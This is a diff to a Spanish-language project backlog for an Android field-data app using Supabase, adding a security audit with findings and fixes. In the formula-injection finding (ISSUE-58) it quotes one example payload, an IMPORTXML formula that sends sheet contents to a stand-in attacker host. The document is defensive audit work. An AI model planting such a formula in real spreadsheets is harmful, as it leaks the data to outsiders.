@@ -221,7 +221,7 @@
 ## 🚀 Épica 9: Despliegue y Piloto
 
 ### `[ISSUE-27]` Conector Google Sheets mínimo (clave secreta + nuevo esquema) · 0,25 d
-* **Descripción:** mantener el conector funcionando hasta el rediseño de la planilla (ISSUE-29).
+* **Descripción:** mantener el conector funcionando hasta el rediseño de la planilla (ISSUE-29). ⚠️ Incluir la protección contra inyección de fórmulas de ISSUE-58.
 * **Criterios de aceptación:**
   - [ ] Leer `SUPABASE_SECRET_KEY` desde Script Properties (nunca en el código ni en el repositorio).
   - [ ] Cambiar la columna "ID Líder (FK)" por "N° Participantes".
@@ -251,7 +251,7 @@
 * Al guardar en P9 se programa una tarea "sincronizar" con la condición "con internet" y reintentos con espera creciente. El botón tricolor se mantiene.
 
 ### `[ISSUE-38]` 🔐 Cuenta por teléfono (Supabase Auth) · ~1 d (al final)
-* Opción elegida para el problema de la clave pública dentro del APK: una cuenta por brigada/teléfono, inicio de sesión una vez; la RPC y el bucket exigen sesión (`authenticated`) y se quita `EXECUTE` a `anon`.
+* Resuelve ISSUE-57 (auditoría 08-11-2026). Opción elegida para el problema de la clave pública dentro del APK: una cuenta por brigada/teléfono, inicio de sesión una vez; la RPC y el bucket exigen sesión (`authenticated`) y se quita `EXECUTE` a `anon`.
 
 ### `[ISSUE-39]` 📝 Protección del inventario de herramientas — anotado, por decidir
 * Riesgo: la RPC actualiza `herramienta_catalogo.estado`, así que quien tenga acceso podría marcar todo como Extraviado. Opciones: (1) la RPC no toca el catálogo y el admin aplica; (2) solo usuarios con sesión (requiere ISSUE-38); (3) el estado solo empeora desde la app; (4) tope por jornada.
@@ -497,6 +497,39 @@
   - Servidor en mantención (tabla `playa_catalogo` renombrada temporalmente): la P1 muestra "Servidor en mantención" y no sincroniza; en Reportes la jornada sigue pendiente.
   - Rechazo (sector `SECTOR-TEST` borrado en el servidor tras cerrar la jornada sin internet): `ERROR_SYNC` con "Sector desconocido o de otra playa", globo rojo y registro en `jornada_rechazada`; "Reintentar" sin cambios → rechazo otra vez (`intentos` 2); con el sector restaurado → sincronizada y `resuelta = true`.
   - Ajuste de UI: sin internet, la tarjeta de sincronización muestra una nube tachada gris y, si no hay pendientes, el texto "Sin internet".
+## 🛡️ Épica 10: Auditoría de seguridad (08-11-2026)
+
+> **Alcance:** código de la app, `supabase_schema.sql`, conector de Google Sheets e historial de git (7 commits), más pruebas en vivo con la clave pública. **Sin hallazgos:** inyección SQL (la RPC no usa SQL dinámico —sin `EXECUTE`/`format`— y lee el JSON con operadores tipados; Room y PostgREST usan parámetros); credenciales en el repositorio o el historial (no hay claves, contraseñas ni URL del proyecto; `local.properties` y keystores en `.gitignore`; la clave secreta no está en la app); permisos de `anon` verificados en vivo (tablas de jornada y `jornada_rechazada` → 401, `PATCH` al inventario → 401, función interna no accesible, bucket no listable); solo HTTPS; log HTTP solo en debug sin la clave; servicio GPS y `FileProvider` no exportados; sin respaldos en la nube.
+> **No revisado:** visibilidad del repositorio en GitHub (sin `gh`), configuración del panel de Supabase (límites de tasa, otras claves activas) y las Script Properties del Apps Script publicado.
+
+### `[ISSUE-57]` 🔴 Clave pública del APK: escritura abierta en Supabase — se resuelve con ISSUE-38
+* **Hallazgo:** la clave publicable se extrae del APK en minutos. Con ella cualquiera puede: (a) enviar jornadas falsas por la RPC (altera los KPIs); (b) marcar herramientas como "Extraviado"/"Dañado" (ISSUE-39); (c) subir archivos de hasta 5 MB al bucket **público**: `allowed_mime_types` solo revisa el encabezado `Content-Type`, no el contenido, así que se podría alojar contenido arbitrario servido desde el proyecto.
+* **Mitigación:** de fondo, ISSUE-38 (cuenta por teléfono; quitar `EXECUTE` y el `INSERT` del bucket a `anon`). Mientras tanto: repartir el APK solo a brigadas de confianza y revisar límites de tasa en el panel de Supabase.
+
+### `[ISSUE-58]` 🔴 Inyección de fórmulas en Google Sheets — latente, corregir antes de ISSUE-27
+* **Hallazgo:** el conector actual no funciona (lee `vista_reporte_jornadas`, que ya no existe, con la clave pública), pero cuando se rehaga y copie nombres, motivos de omisión, encargado de pesaje o N° de guía con `setValues()`, un texto que empiece con `=` se ejecutará como fórmula. Ej.: un "voluntario" `=IMPORTXML("https://atacante…?"&A1:Z99)` enviaría el contenido de la planilla a un tercero. Con ISSUE-57 cualquiera puede inyectar ese texto.
+* **Criterios de aceptación:**
+  - [ ] RPC: rechazar textos libres (nombres, `encargado_pesaje`, `nro_guia_despacho`, `motivo_omision_*`) que empiecen con `=`, `+`, `-`, `@`, tabulador o retorno de carro; misma regla en `ValidadorJornada` y en los campos de la app.
+  - [ ] Conector (ISSUE-27): anteponer `'` a todo texto antes de `setValues()`.
+
+### `[ISSUE-59]` 🟠 ID de jornada corto: fotos públicas adivinables y suplantación de jornadas
+* **Hallazgo:** el sufijo del ID son 6 caracteres hexadecimales de un UUID (`JornadaFlujoViewModel.kt`, `UUID.randomUUID().toString().take(6)`): ~16,7 millones de combinaciones por día. Las fotos (pueden mostrar caras, Ley 21.719 — ISSUE-40) son públicas en `…/REG-AAAAMMDD-XXXXXX_{1|2|3}_{tipo}.jpg`. Riesgos: (a) recorrer URLs por fuerza bruta; (b) **adelantarse a una jornada real**: si alguien sube antes una jornada o una foto con ese ID, la real recibe `YA_EXISTIA` / "ya existe", se marca sincronizada y sus datos se pierden en silencio.
+* **Criterios de aceptación:**
+  - [ ] Sufijo de 12 caracteres (~281 billones de combinaciones); el formato `[A-Z0-9]{4,12}` de la RPC, del bucket y de `ValidadorJornada` ya lo acepta.
+  - [ ] De fondo (ISSUE-40): bucket privado con URLs firmadas.
+
+### `[ISSUE-60]` 🟠 Llenado de la base de datos con la clave pública
+* **Hallazgo:** `jornada_rechazada` acepta hasta 5.000 rechazos sin resolver de hasta 100 KB cada uno (`c_max_payload`): ~500 MB, todo el plan gratuito. Las jornadas válidas no tienen tope. Un payload real pesa 1–5 KB.
+* **Criterios de aceptación:**
+  - [ ] Bajar `c_max_payload` a ~20 KB y agregar un tope total de tamaño de `jornada_rechazada`.
+  - [ ] Evaluar un tope de jornadas por día (o por brigada y día) en la RPC.
+
+### `[ISSUE-61]` 🟡 Hallazgos menores de seguridad — anotados
+* La RPC responde `YA_EXISTIA`: permite saber si un ID existe (no revela sus datos).
+* Las fotos y los datos (nombres, GPS) quedan en el teléfono después de sincronizar; protegidos por el sandbox de Android, pero nunca se borran. Evaluar borrar las fotos locales tras subirlas.
+* `SECURITY DEFINER` con `search_path = public`; lo recomendado es `pg_catalog, public` (riesgo mínimo: `anon` no puede crear objetos).
+* Informativo: `gradle.properties` incluye una ruta con el nombre de usuario (ya en ISSUE-28); `proguard-rules.pro` apunta a un paquete inexistente (`data.remote.dto`): si se activa la minificación, la sincronización con Gson fallaría.
+
 ---
 
 ## Orden y Estimación
@@ -509,6 +542,7 @@
 | 4 | **ISSUE-31 → 32 → 33 → 34 → 35 → 36** (cambios v4) | 2,75 d |
 | 5 | ✅ ISSUE-24 → 25 → 26 | 2,25 d |
 | 6 | ISSUE-41 ✅ (UI P1), ISSUE-42 → 28 → 29 | 3,5 d |
+| 6b | Seguridad antes del piloto: ISSUE-59, ISSUE-60, ISSUE-58 (parte RPC); luego ISSUE-57 vía ISSUE-38 | ~1 d |
 | 7 | ISSUE-37, ISSUE-27 (Sheets), ISSUE-38, ISSUE-43 (catálogos, por decidir) | 1,75 d |
 | **Total** | | **≈ 16 días** |
 
